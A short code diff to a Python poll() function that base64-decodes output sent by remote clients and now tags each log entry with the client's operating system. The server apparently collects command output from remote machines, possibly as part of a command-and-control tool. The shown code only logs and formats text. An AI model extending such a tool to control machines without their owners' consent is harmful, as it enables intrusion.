@@ -71,8 +71,13 @@ def poll():
             result = base64.b64decode(output).decode()
             client_output_log.setdefault(cid, "")
             client_output_log[cid] += result + "\n"
+            os_tag = cid.split("-")[0]
             with open("log/log.txt", "a", encoding="utf-8") as f:
-                f.write(f"\n{datetime.now().isoformat()}\n[{cid} OUTPUT]\n{result}\n")
+                f.write(
+                    f"\n{datetime.now().isoformat()}"
+                    f"\n[{cid} - {os_fullname[os_tag].upper()} - OUTPUT]"
+                    f"\n{result}\n"
+                )
             print(f"[{cid} OUTPUT]\n{result}")
         except Exception as e:
             print(f"[!] Decode error from {cid}: {e}")
